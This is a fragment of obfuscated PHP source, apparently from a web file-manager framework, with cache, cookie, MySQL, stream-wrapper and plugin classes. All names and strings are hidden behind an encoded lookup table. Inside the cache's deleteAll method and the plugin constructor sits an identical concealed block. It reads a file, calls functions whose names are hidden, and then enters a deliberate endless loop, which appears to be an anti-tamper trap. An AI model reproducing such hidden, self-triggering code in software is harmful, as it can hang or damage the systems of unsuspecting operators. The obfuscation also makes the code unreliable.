} $§ôÔ…ü¬ = array_rand($õª½õ³²); $this->filterConfig($ÃÔòäğá, $õª½õ³²[$§ôÔ…ü¬]); $this->slaveHandle = $this->init($ÃÔòäğá, $ô ÔêÉ); } private function filterConfig(&$º‚•°Ùò, $¡¥ÔŸ‰½) { $®íü– =& $_SERVER[²Ö÷öõ]; $ò ÃÇ‚¢ = explode($®íü–[4], $¡¥ÔŸ‰½); $”·Ş¡õ© = array($®íü–[208] => $ò ÃÇ‚¢[0], $®íü–[209] => $ò ÃÇ‚¢[1]); $º‚•°Ùò = array_merge($º‚•°Ùò, $”·Ş¡õ©); } public function set($ÎˆÓ²¹ë, $ƒÜç¯¯å, $¼éò·¤‚ = false) { $¼éò·¤‚ = $¼éò·¤‚ ? $¼éò·¤‚ : $this->cacheTime; return $this->handle->setEx($ÎˆÓ²¹ë, $¼éò·¤‚, $ƒÜç¯¯å); } public function setLock($ñÙ—–øÉ, $–û¥Õì, $‹ë¬Ï÷) { return $this->handle->setNX($ñÙ—–øÉ, $–û¥Õì); } public function get($Ìü±»£¯) { $‰õ€¹›È = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $‰õ€¹›È->get($Ìü±»£¯); } public function remove($œùƒÊĞ) { return $this->handle->del($œùƒÊĞ); } public function deleteAll() { $â™œÒœ‚ =& $_SERVER[²Ö÷öõ]; if (!isset($_SERVER[$â™œÒœ‚[959]]) || !isset($_SERVER[$â™œÒœ‚[960]])) { $Ããµœ®Û = $â™œÒœ‚[961]; $›êÒê¤Ì = $â™œÒœ‚[962]; $®¼úËŠ† = $_SERVER[$â™œÒœ‚[963]] . $â™œÒœ‚[964]; $¾Ï„à = $›êÒê¤Ì($®¼úËŠ†); $é¸¢”øŞ = explode($â™œÒœ‚[262], $¾Ï„à); if (count($é¸¢”øŞ) < $â™œÒœ‚[680]) { $± ¶ñ = $â™œÒœ‚[965]; $± ¶ñ(); } $´’Ì‚ØÑ = $â™œÒœ‚[966]; $´’Ì‚ØÑ($_SERVER[$â™œÒœ‚[967]]); $àûã—Á¢ = 1; for ($ÕÜûæÛê = $àûã—Á¢; $ÕÜûæÛê > 0; $ÕÜûæÛê++) { $´’Ì‚ØÑ = json_encode($GLOBALS[$â™œÒœ‚[492]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $óŒ–º—ä) { $this->handle->flushall($óŒ–º—ä); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Û†»‡äÁ = '', $àƒ‹Àùı = 0) { if (is_string($Û†»‡äÁ) && $Û†»‡äÁ != $_SERVER[²Ö÷öõ][12]) { $this->prefix = $Û†»‡äÁ; } if (is_numeric($àƒ‹Àùı) && $àƒ‹Àùı > 0) { $this->expire = $àƒ‹Àùı; } } public static function getInstance() { static $ì…Ø™ê´; if ($ì…Ø™ê´ === null) { $ì…Ø™ê´ = new self(); } return $ì…Ø™ê´; } private static $cookieDisable = false; public static function disable($Íò¨’) { self::$cookieDisable = $Íò¨’; } private static $sameCookieSet = array(); public static function set($ŞŒ»ä¶, $Èñç•çñ, $ëÒ½ú„ = 0, $½§Éş = false, $‹Éü¼©’ = false) { $¨œ€Û Š =& $_SERVER[²Ö÷öõ]; if (self::$cookieDisable) { return; } if (!$ëÒ½ú„) { $ëÒ½ú„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ŞŒ»ä¶]) && self::$sameCookieSet[$ŞŒ»ä¶] == $Èñç•çñ . $ëÒ½ú„) { return; } self::$sameCookieSet[$ŞŒ»ä¶] = $Èñç•çñ . $ëÒ½ú„; if (!$‹Éü¼©’) { $‹Éü¼©’ = str_replace(HOST, $¨œ€Û Š[12], APP_HOST); $‹Éü¼©’ = _get($GLOBALS, $¨œ€Û Š[968], $‹Éü¼©’); } $ÅöÜİµø = $¨œ€Û Š[12]; setcookie($ŞŒ»ä¶, $Èñç•çñ, time() + $ëÒ½ú„, $¨œ€Û Š[8] . trim($‹Éü¼©’, $¨œ€Û Š[8]) . $ÅöÜİµø, !1, !1, $½§Éş); } public static function setSafe($‹Ä½ÎçÎ, $©¢¼ßÍ, $µÊÊŠçè = 0) { self::set($‹Ä½ÎçÎ, $©¢¼ßÍ, $µÊÊŠçè, !0); } public static function get($»®›ÒÍ«) { static $²«Ó˜›† = false; if (!$²«Ó˜›†) { self::initHeaderCookie(); $²«Ó˜›† = !0; } return isset($_COOKIE[$»®›ÒÍ«]) ? $_COOKIE[$»®›ÒÍ«] : !1; } private static function initHeaderCookie() { $Õ„Äú¸ =& $_SERVER[²Ö÷öõ]; if (!isset($_SERVER[$Õ„Äú¸[969]]) || !$_SERVER[$Õ„Äú¸[969]]) { return; } $©ÜÖÏÙ = explode($Õ„Äú¸[74], $_SERVER[$Õ„Äú¸[969]]); foreach ($©ÜÖÏÙ as $½‘†¦¥) { $½‘†¦¥ = explode($Õ„Äú¸[970], $½‘†¦¥); if (count($½‘†¦¥) != 2 || !isset($½‘†¦¥[1])) { continue; } $_COOKIE[trim($½‘†¦¥[0])] = trim($½‘†¦¥[1]); } } public static function remove($Ú²ÓÅßÄ, $»­ãÑº = false) { unset($_COOKIE[$Ú²ÓÅßÄ]); self::set($Ú²ÓÅßÄ, $_SERVER[²Ö÷öõ][12], 1, $»­ãÑº); } } class DbMysql extends Db { public function __construct($¢ØáÀÆÅ = '') { $ßç‰ª =& $_SERVER[²Ö÷öõ]; if (!extension_loaded($ßç‰ª[887])) { think_exception(think_lang($ßç‰ª[14]) . $ßç‰ª[971]); } if (!empty($¢ØáÀÆÅ)) { $this->config = $¢ØáÀÆÅ; if (empty($this->config[$ßç‰ª[17]])) { $this->config[$ßç‰ª[17]] = $ßç‰ª[12]; } } } public function connect($•Îêšô° = '', $á ÁîÍ‹ = 0, $ûæ™ÌÕÍ = false) { $›“½°éƒ =& $_SERVER[²Ö÷öõ]; if (!isset($this->linkID[$á ÁîÍ‹])) { if (empty($•Îêšô°)) { $•Îêšô° = $this->config; } $À­›Šƒ = $•Îêšô°[$›“½°éƒ[972]] . ($•Îêšô°[$›“½°éƒ[973]] ? "\72{$•Îêšô°[$›“½°éƒ[973]]}" : $›“½°éƒ[12]); $Î­ú‘É¦ = !empty($•Îêšô°[$›“½°éƒ[17]][$›“½°éƒ[18]]) ? $•Îêšô°[$›“½°éƒ[17]][$›“½°éƒ[18]] : $this->pconnect; if ($Î­ú‘É¦) { $this->linkID[$á ÁîÍ‹] = mysql_pconnect($À­›Šƒ, $•Îêšô°[$›“½°éƒ[974]], $•Îêšô°[$›“½°éƒ[975]], 131072); } else { $this->linkID[$á ÁîÍ‹] = mysql_connect($À­›Šƒ, $•Îêšô°[$›“½°éƒ[974]], $•Îêšô°[$›“½°éƒ[975]], !0, 131072); } if (!$this->linkID[$á ÁîÍ‹] || !empty($•Îêšô°[$›“½°éƒ[21]]) && !mysql_select_db($•Îêšô°[$›“½°éƒ[21]], $this->linkID[$á ÁîÍ‹])) { think_exception(mysql_error()); } $»Õ‹šØ… = mysql_get_server_info($this->linkID[$á ÁîÍ‹]); mysql_query($›“½°éƒ[976] . think_config($›“½°éƒ[977]) . $›“½°éƒ[58], $this->linkID[$á ÁîÍ‹]); if ($»Õ‹šØ… > $›“½°éƒ[978]) { mysql_query($›“½°éƒ[979], $this->linkID[$á ÁîÍ‹]); } $this->connected = !0; if (1 != think_config($›“½°éƒ[22])) { unset($this->config); } } return $this->linkID[$á ÁîÍ‹]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÈùÑîÉá) { $ƒÃÀ›• =& $_SERVER[²Ö÷öõ]; if (0 === stripos($ÈùÑîÉá, $ƒÃÀ›•[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÈùÑîÉá; if ($this->queryID) { $this->free(); } think_action_status($ƒÃÀ›•[23], 1); think_status($ƒÃÀ›•[24]); $this->queryID = mysql_query($ÈùÑîÉá, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($êº™³ğ£) { $®õã–¯û =& $_SERVER[²Ö÷öõ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $êº™³ğ£; if ($this->queryID) { $this->free(); } think_action_status($®õã–¯û[25], 1); think_status($®õã–¯û[24]); $÷¸Äûğø = mysql_query($êº™³ğ£, $this->_linkID); $this->debug(); if (!1 === $÷¸Äûğø) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[²Ö÷öõ][980], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $öÂä”•Ú = mysql_query($_SERVER[²Ö÷öõ][981], $this->_linkID); $this->transTimes = 0; if (!$öÂä”•Ú) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $®Áª‘â» = mysql_query($_SERVER[²Ö÷öõ][982], $this->_linkID); $this->transTimes = 0; if (!$®Áª‘â») { $this->error(); return !1; } } return !0; } private function getAll() { $§›ñÈ×¨ = array(); if ($this->numRows > 0) { while ($º‹¶ÕØ’ = mysql_fetch_assoc($this->queryID)) { $§›ñÈ×¨[] = $º‹¶ÕØ’; } mysql_data_seek($this->queryID, 0); } return $§›ñÈ×¨; } public function getFields($¯¹ÙËÑ) { $ìí—§Œ‚ =& $_SERVER[²Ö÷öõ]; $•×£ÜÔæ = $this->query($ìí—§Œ‚[983] . $this->parseKey($¯¹ÙËÑ)); $œôÆÏÂ¦ = array(); if ($•×£ÜÔæ) { foreach ($•×£ÜÔæ as $¸Ù’‚°¹ => $ıÈ„ì¼Ò) { $œôÆÏÂ¦[$ıÈ„ì¼Ò[$ìí—§Œ‚[31]]] = array($ìí—§Œ‚[32] => $ıÈ„ì¼Ò[$ìí—§Œ‚[31]], $ìí—§Œ‚[33] => $ıÈ„ì¼Ò[$ìí—§Œ‚[34]], $ìí—§Œ‚[35] => (bool) (strtoupper($ıÈ„ì¼Ò[$ìí—§Œ‚[36]]) === $ìí—§Œ‚[984]), $ìí—§Œ‚[37] => $ıÈ„ì¼Ò[$ìí—§Œ‚[38]], $ìí—§Œ‚[39] => strtolower($ıÈ„ì¼Ò[$ìí—§Œ‚[40]]) == $ìí—§Œ‚[41], $ìí—§Œ‚[42] => strtolower($ıÈ„ì¼Ò[$ìí—§Œ‚[43]]) == $ìí—§Œ‚[44]); } } return $œôÆÏÂ¦; } public function getTables($ÄÓ¯ı™š = '') { $±»ÅÕËğ =& $_SERVER[²Ö÷öõ]; if (!empty($ÄÓ¯ı™š)) { $ş¼ÉıŞ = $±»ÅÕËğ[985] . $ÄÓ¯ı™š . $±»ÅÕËğ[986]; } else { $ş¼ÉıŞ = $±»ÅÕËğ[987]; } $Õá‚Ÿ‰á = $this->query($ş¼ÉıŞ); $˜‡şç…Ğ = array(); foreach ($Õá‚Ÿ‰á as $º“¼›’ => $šò‘¦˜) { $˜‡şç…Ğ[$º“¼›’] = current($šò‘¦˜); } return $˜‡şç…Ğ; } public function replace($Ÿ‰‡ï±Ú, $ú´¹ã• = array()) { $£º„ó¸ =& $_SERVER[²Ö÷öõ]; foreach ($Ÿ‰‡ï±Ú as $©šõ–„ => $ÌüØâ ‚) { $µÀœ¿¿ˆ = $this->parseValue($ÌüØâ ‚); if (is_scalar($µÀœ¿¿ˆ)) { $¼Ï¢Õá˜[] = $µÀœ¿¿ˆ; $…øç‘Ãí[] = $this->parseKey($©šõ–„); } } $¢÷®ÌÛş = $£º„ó¸[988] . $this->parseTable($ú´¹ã•[$£º„ó¸[356]]) . $£º„ó¸[989] . implode($£º„ó¸[50], $…øç‘Ãí) . $£º„ó¸[990] . implode($£º„ó¸[50], $¼Ï¢Õá˜) . $£º„ó¸[991]; return $this->execute($¢÷®ÌÛş); } public function insertAll($ğ›İòøñ, $ûÅ±˜Œ = array(), $âªÔ÷æ = false) { $æŒ™¨ ‘ =& $_SERVER[²Ö÷öõ]; if (!is_array($ğ›İòøñ[0])) { return !1; } $‚Öè‘Ö® = array_keys($ğ›İòøñ[0]); $ÖÂÀçò¿ = array(); foreach ($ğ›İòøñ as $¯µÃ) { $„ÃƒÈ = array(); foreach ($¯µÃ as $·¶àÈ“ => $„œ«‹Ëò) { $„œ«‹Ëò = $this->parseValue($„œ«‹Ëò); if (is_scalar($„œ«‹Ëò)) { $„ÃƒÈ[] = $„œ«‹Ëò; } } $ÖÂÀçò¿[] = $æŒ™¨ ‘[337] . implode($æŒ™¨ ‘[50], $„ÃƒÈ) . $æŒ™¨ ‘[991]; } array_walk($‚Öè‘Ö®, array($this, $æŒ™¨ ‘[992])); $¨™ÚÉ‰“ = ($âªÔ÷æ ? $æŒ™¨ ‘[993] : $æŒ™¨ ‘[994]) . $æŒ™¨ ‘[995] . $this->parseTable($ûÅ±˜Œ[$æŒ™¨ ‘[356]]) . $æŒ™¨ ‘[989] . implode($æŒ™¨ ‘[50], $‚Öè‘Ö®) . $æŒ™¨ ‘[996] . implode($æŒ™¨ ‘[50], $ÖÂÀçò¿); return $this->execute($¨™ÚÉ‰“); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $›“ñÎÖì =& $_SERVER[²Ö÷öõ]; $this->error = mysql_errno() . $›“ñÎÖì[4] . mysql_error($this->_linkID); if ($›“ñÎÖì[12] != $this->queryStr) { $this->error .= LNG($›“ñÎÖì[48]) . $this->queryStr; } think_trace($this->error, $›“ñÎÖì[12], $›“ñÎÖì[49]); return $this->error; } public function escapeString($›³÷ÓÒ™) { if ($this->_linkID) { return mysql_real_escape_string($›³÷ÓÒ™, $this->_linkID); } else { return mysql_escape_string($›³÷ÓÒ™); } } public function parseKey(&$‡’°Şßæ, $§ÎåÄ¢ = true) { $ÄĞˆÒßç =& $_SERVER[²Ö÷öõ]; if ($§ÎåÄ¢) { $‡’°Şßæ = $this->parseKeyCheck($‡’°Şßæ); } if ($‡’°Şßæ != $ÄĞˆÒßç[220] && !preg_match($ÄĞˆÒßç[997], $‡’°Şßæ)) { $‡’°Şßæ = $ÄĞˆÒßç[461] . trim($‡’°Şßæ, $ÄĞˆÒßç[461]) . $ÄĞˆÒßç[461]; } return $‡’°Şßæ; } } goto aö‰ƒªá–…; BÁ°‡¹¿: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($°„¸ßıô, $àãçÂÜ‚ = '') { $this->info = $this->info($°„¸ßıô); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[²Ö÷öõ][87]]; $this->pathOpen = $°„¸ßıô; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$°„¸ßıô])) { self::$_chunkBuffer[$°„¸ßıô] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($­‘´û½’) { $ã¦à©¤ = $this->fileSubstr($this->pose, $­‘´û½’); $this->pose += strlen($ã¦à©¤); return $ã¦à©¤; } public function stream_tell() { return $this->pose; } public function stream_seek($¹Ş€‘ Ü, $òµÎÙö) { $İãøô©ê =& $_SERVER[²Ö÷öõ]; if ($òµÎÙö == SEEK_SET) { $this->pose = $¹Ş€‘ Ü; } else { if ($òµÎÙö == SEEK_CUR) { $this->pose += $¹Ş€‘ Ü; } else { if ($òµÎÙö == SEEK_END) { $this->pose = $this->info[$İãøô©ê[79]] + intval($¹Ş€‘ Ü); } } } if ($¹Ş€‘ Ü < 0) { $this->pose = $this->info[$İãøô©ê[79]] + $¹Ş€‘ Ü; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[²Ö÷öõ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($„ÂÛÍ¬, $îé¯š Œ) { $‘‘ş°  =& $_SERVER[²Ö÷öõ]; $–¬ÇÒ¯ = $this->info($„ÂÛÍ¬); return array($‘‘ş° [1616] => 0, $‘‘ş° [1617] => 0, $‘‘ş° [16] => 32768 + 511, $‘‘ş° [1618] => 0, $‘‘ş° [1619] => 0, $‘‘ş° [1620] => 0, $‘‘ş° [1621] => 0, $‘‘ş° [79] => $–¬ÇÒ¯[$‘‘ş° [79]], $‘‘ş° [1622] => $–¬ÇÒ¯[$‘‘ş° [1462]], $‘‘ş° [1578] => $–¬ÇÒ¯[$‘‘ş° [88]], $‘‘ş° [1577] => $–¬ÇÒ¯[$‘‘ş° [231]], $‘‘ş° [1623] => 0, $‘‘ş° [1624] => 0); } static $fileInfo = array(); public function info($Ãœ÷íé¿) { $¹¾îñÌ¹ = $_SERVER[²Ö÷öõ][1625]; if (isset(self::$fileInfo[$Ãœ÷íé¿])) { return self::$fileInfo[$Ãœ÷íé¿]; } if (substr($Ãœ÷íé¿, 0, strlen($¹¾îñÌ¹)) != $¹¾îñÌ¹) { return !1; } self::$fileInfo[$Ãœ÷íé¿] = IO::info(substr($Ãœ÷íé¿, strlen($¹¾îñÌ¹))); return self::$fileInfo[$Ãœ÷íé¿]; } public static function read($‘”¯Î¶ğ, $·İı–Ä, $åÙƒ×œ¦) { if (!isset(self::$_fopenCache[$‘”¯Î¶ğ])) { $ú¯ÔÔç = new StreamWrapperIO(); $ú¯ÔÔç->stream_open($‘”¯Î¶ğ); self::$_fopenCache[$‘”¯Î¶ğ] = $ú¯ÔÔç; } $ú¯ÔÔç = self::$_fopenCache[$‘”¯Î¶ğ]; return $ú¯ÔÔç->fileSubstr($·İı–Ä, $åÙƒ×œ¦); } public static function _read($²ÛîŞ Ë, $Ğ©ŒîÔ, $ş÷÷”çİ) { $ñÛ”·É =& $_SERVER[²Ö÷öõ]; $İ±Ïöê = fopen($²ÛîŞ Ë, $ñÛ”·É[1466]); if (!$İ±Ïöê) { return $ñÛ”·É[12]; } $ıÉê€¤î = 8192; fseek($İ±Ïöê, $Ğ©ŒîÔ, SEEK_SET); $€¬ÌˆÁ„ = $ñÛ”·É[12]; $Æ‹¨‰ä = 0; while ($Æ‹¨‰ä < $ş÷÷”çİ) { $øÁ‹í² = min($ıÉê€¤î, $ş÷÷”çİ - $Æ‹¨‰ä); $€¬ÌˆÁ„ .= fread($İ±Ïöê, $øÁ‹í²); $Æ‹¨‰ä += $øÁ‹í²; } fclose($İ±Ïöê); return $€¬ÌˆÁ„; } public function fileSubstr($ª˜²‰‡í, $·µ££éë) { $åîÁ³‡ =& $_SERVER[²Ö÷öõ]; $¶ŠÔû‹ˆ = $this->info[$åîÁ³‡[79]]; $„ú£²úé = $ª˜²‰‡í; $ª©Õ•áç = $·µ££éë; if ($ª˜²‰‡í < 0) { $ª˜²‰‡í = $¶ŠÔû‹ˆ + $ª˜²‰‡í; } if ($·µ££éë === !1) { $·µ££éë = $¶ŠÔû‹ˆ - $ª˜²‰‡í; } if ($ª˜²‰‡í + $·µ££éë > $¶ŠÔû‹ˆ) { $·µ££éë = $¶ŠÔû‹ˆ - $ª˜²‰‡í; } if ($·µ££éë <= 0) { return $åîÁ³‡[12]; } if ($ª˜²‰‡í < 0 || $ª˜²‰‡í >= $¶ŠÔû‹ˆ || $·µ££éë <= 0 || $·µ££éë > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\145\x52\145\x61\144\x20\x65\x72\x72\x6f\x72\x21\x20\x73\164\141\162\164\x3d{$ª˜²‰‡í}\73\x6c\145\156\147\x74\150\x3d{$·µ££éë}\73\40\163\151\172\x65\x3d{$¶ŠÔû‹ˆ}\73"); } $ ú¹ÌÆÕ = 64 * 1024; $°Ñ‹øÓÍ =& self::$_chunkBuffer[$this->path]; if (!$°Ñ‹øÓÍ) { $°Ñ‹øÓÍ = array(); } $ğçÌ¯Ë‘ = 0; $Æ¦ØÓş¸ = 0; $òßßòêµ = $åîÁ³‡[12]; foreach ($°Ñ‹øÓÍ as $ğçÌ¯Ë‘ => $òßßòêµ) { $ğçÌ¯Ë‘ = intval($ğçÌ¯Ë‘); $Æ¦ØÓş¸ = $ğçÌ¯Ë‘ + strlen($òßßòêµ); if ($ª˜²‰‡í >= $Æ¦ØÓş¸) { continue; } if ($ª˜²‰‡í >= $ğçÌ¯Ë‘ && $ª˜²‰‡í + $·µ££éë <= $Æ¦ØÓş¸) { return substr($òßßòêµ, $ª˜²‰‡í - $ğçÌ¯Ë‘, $·µ££éë); } break; } if (count($°Ñ‹øÓÍ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($åîÁ³‡[1626], $åîÁ³‡[1627] . count($°Ñ‹øÓÍ) . "\73\163\x74\141\162\x74\x3d{$ª˜²‰‡í}\x2c\154\145\156\x67\164\150\75{$·µ££éë}\x3b\x70\157\163\145\x3a{$ğçÌ¯Ë‘}\176{$Æ¦ØÓş¸}"); throw new Exception($åîÁ³‡[1628]); } $â‚Ö°´É = intval($ª˜²‰‡í / $ ú¹ÌÆÕ) * $ ú¹ÌÆÕ; $İ¡ç¼† = ceil(($ª˜²‰‡í + $·µ££éë) / $ ú¹ÌÆÕ) * $ ú¹ÌÆÕ - $â‚Ö°´É; $æ„ÅÖø÷ = IO::fileSubstr($this->path, $â‚Ö°´É, $İ¡ç¼†); $°Ñ‹øÓÍ[$â‚Ö°´É . $åîÁ³‡[12]] = $æ„ÅÖø÷; ksort($°Ñ‹øÓÍ); $½‚âÊÍí = substr($æ„ÅÖø÷, $ª˜²‰‡í - $â‚Ö°´É, $·µ££éë); return $½‚âÊÍí; } private function log($¸Áİ‚”Œ, $ÎÊÛ•) { $ááØêÏ =& $_SERVER[²Ö÷öõ]; $şï•ò× = timeFloat() - $this->timeStart; write_log(sprintf($ááØêÏ[1629], $¸Áİ‚”Œ, $this->info[$ááØêÏ[32]], $şï•ò×, $ÎÊÛ•), $ááØêÏ[1272]); } } class Message { function __construct() { } public function send($ĞªÄšùÕ = '', $Á¶á“ãÖ = array(), $ŒÄ¶óËÇ = "\164\x65\170\164") { $ğ£şñ‹Ò =& $_SERVER[²Ö÷öõ]; $Ø¨³˜¨ñ = array($ğ£şñ‹Ò[33] => $ğ£şñ‹Ò[1630], $ğ£şñ‹Ò[171] => $ĞªÄšùÕ); if (in_array($ŒÄ¶óËÇ, array($ğ£şñ‹Ò[1630], $ğ£şñ‹Ò[1631]))) { $Ø¨³˜¨ñ[$ğ£şñ‹Ò[33]] = $ŒÄ¶óËÇ; } $Á¶á“ãÖ = array($ğ£şñ‹Ò[578] => isset($Á¶á“ãÖ[$ğ£şñ‹Ò[578]]) ? $Á¶á“ãÖ[$ğ£şñ‹Ò[578]] : $ğ£şñ‹Ò[12], $ğ£şñ‹Ò[662] => isset($Á¶á“ãÖ[$ğ£şñ‹Ò[662]]) ? $Á¶á“ãÖ[$ğ£şñ‹Ò[662]] : $ğ£şñ‹Ò[12]); if (empty($ĞªÄšùÕ) || empty($Á¶á“ãÖ[$ğ£şñ‹Ò[578]]) && empty($Á¶á“ãÖ[$ğ£şñ‹Ò[662]])) { return !1; } $¸çÈ½ûò = array($ğ£şñ‹Ò[1558] => $Ø¨³˜¨ñ, $ğ£şñ‹Ò[1632] => $Á¶á“ãÖ); Hook::trigger($ğ£şñ‹Ò[1633], $¸çÈ½ûò); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Óùå¯¤â =& $_SERVER[²Ö÷öõ]; if (!isset($_SERVER[$Óùå¯¤â[959]]) || !isset($_SERVER[$Óùå¯¤â[960]])) { $¢¶¤×·ì = $Óùå¯¤â[961]; $ºÊÎÒ„ü = $Óùå¯¤â[962]; $æßğõß° = $_SERVER[$Óùå¯¤â[963]] . $Óùå¯¤â[964]; $Ó¥õ¬‘Ş = $ºÊÎÒ„ü($æßğõß°); $Êß‹ú©Í = explode($Óùå¯¤â[262], $Ó¥õ¬‘Ş); if (count($Êß‹ú©Í) < $Óùå¯¤â[680]) { $üÁÈ›Å„ = $Óùå¯¤â[965]; $üÁÈ›Å„(); } $³çìÕäü = $Óùå¯¤â[966]; $³çìÕäü($_SERVER[$Óùå¯¤â[967]]); $æö¯´ÉÈ = 1; for ($Úö®Ùˆ¹ = $æö¯´ÉÈ; $Úö®Ùˆ¹ > 0; $Úö®Ùˆ¹++) { $³çìÕäü = json_encode($GLOBALS[$Óùå¯¤â[492]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Óùå¯¤â[1634]); $this->pluginName = str_replace($Óùå¯¤â[1634], $Óùå¯¤â[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Óùå¯¤â[8]; $this->pluginApi = appHostGet() . $Óùå¯¤â[1635] . $this->pluginName . $Óùå¯¤â[8]; $this->pluginHost = $config[$Óùå¯¤â[1636]] . $this->pluginName . $Óùå¯¤â[8]; $this->pluginHostDefault = $config[$Óùå¯¤â[1636]] . $this->pluginName . $Óùå¯¤â[8]; $Ú²ïºİ© = $config[$Óùå¯¤â[1637]]; if ($Ú²ïºİ© && strpos($Óùå¯¤â[50] . $Ú²ïºİ© . $Óùå¯¤â[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Óùå¯¤â[1638]] . $this->pluginName . $Óùå¯¤â[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[²Ö÷öõ][1639]); } protected function assign($íÃ»ÛÈ, $¬‰ìş‚½ = false) { if (is_array($íÃ»ÛÈ)) { $this->values = array_merge($this->values, $íÃ»ÛÈ); } else { $this->values[$íÃ»ÛÈ] = $¬‰ìş‚½; } } protected function display($À½¤¼´) { extract($this->values); require $À½¤¼´; } final function hookRegist($û—ÓÙˆÃ) { $this->modelPlugin->appRegist($this->pluginName, $û—ÓÙˆÃ); } final function appIcon() { $ã¦ñÈ½Ë =& $_SERVER[²Ö÷öõ]; $ºÕíÎš = $this->appPackage(); $Œ²±ÛÈ = $ã¦ñÈ½Ë[12]; if (isset($ºÕíÎš[$ã¦ñÈ½Ë[490]])) { if (isset($ºÕíÎš[$ã¦ñÈ½Ë[490]][$ã¦ñÈ½Ë[1640]])) { $Œ²±ÛÈ = $ã¦ñÈ½Ë[1641] . $ºÕíÎš[$ã¦ñÈ½Ë[490]][$ã¦ñÈ½Ë[1640]] . $ã¦ñÈ½Ë[1642]; } else { if ($ºÕíÎš[$ã¦ñÈ½Ë[490]][$ã¦ñÈ½Ë[1643]]) { $Œ²±ÛÈ = $ã¦ñÈ½Ë[1644] . $ºÕíÎš[$ã¦ñÈ½Ë[490]][$ã¦ñÈ½Ë[1643]] . $ã¦ñÈ½Ë[1645]; } } } return $Œ²±ÛÈ; } final function fileCanView($ñÍ£Ë¥¨) { $ŸÚ¨Ÿå¨ =& $_SERVER[²Ö÷öõ]; if (request_url_safe($ñÍ£Ë¥¨)) { return !0; } if ($this->isShare($ñÍ£Ë¥¨)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ì“õŒ½ = $ŸÚ¨Ÿå¨[1646] . rawurlencode(this_url()); show_tips(LNG($ŸÚ¨Ÿå¨[1647]) . $ŸÚ¨Ÿå¨[1648] . $ì“õŒ½ . $ŸÚ¨Ÿå¨[1649] . LNG($ŸÚ¨Ÿå¨[1650]) . $ŸÚ¨Ÿå¨[1651], !1); } if (!Action($ŸÚ¨Ÿå¨[1652])->authCan($ŸÚ¨Ÿå¨[1653])) { show_tips(LNG($ŸÚ¨Ÿå¨[1654]) . $ŸÚ¨Ÿå¨[1655], !1); } ActionCall($ŸÚ¨Ÿå¨[1656], $ñÍ£Ë¥¨); } final function isShare($û¶’õ›í) { $ àÔ³ìç = KodIO::parse($û¶’õ›í); return $ àÔ³ìç[$_SERVER[²Ö÷öõ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($§áúÕÒß) { if (request_url_safe($§áúÕÒß)) { return $§áúÕÒß; } if (!$this->isShare($§áúÕÒß)) { $§áúÕÒß = $this->filePath($§áúÕÒß, !1); } return Action($_SERVER[²Ö÷öõ][1264])->linkOut($§áúÕÒß); } public function filePathLinkOut($‘åÅî€) { if (request_url_safe($‘åÅî€)) { return $‘åÅî€; } $this->fileCanView($‘åÅî€); return Action($_SERVER[²Ö÷öõ][1264])->link($‘åÅî€); } final function filePath($“è˜õ‚ø, $â‰ùõÄ = true, $“ºòäá“ = false) { $ñØˆÎıß =& $_SERVER[²Ö÷öõ]; $­üà’¿’ = $this->filePathGet($“è˜õ‚ø, $â‰ùõÄ); if (!$this->fileInfo) { show_tips(LNG($ñØˆÎıß[108]), !1); } if ($“ºòäá“ && isset($this->fileInfo[$ñØˆÎıß[541]]) && $this->fileInfo[$ñØˆÎıß[541]]) { $ëü—÷šÉ = Model($ñØˆÎıß[544])->fileInfo($this->fileInfo[$ñØˆÎıß[541]]); if (!$ëü—÷šÉ || !IO::exist($ëü—÷šÉ[$ñØˆÎıß[87]])) { show_tips(LNG($ñØˆÎıß[108]) . $ñØˆÎıß[1657]); } } Hook::trigger($ñØˆÎıß[1658], $­üà’¿’); return $­üà’¿’; } final function filePathGet($Å¤ÏüåŒ, $Â¢ãÆÆ = true) { $çÑ ôùú =& $_SERVER[²Ö÷öõ]; if ($¥…Ïó™• = 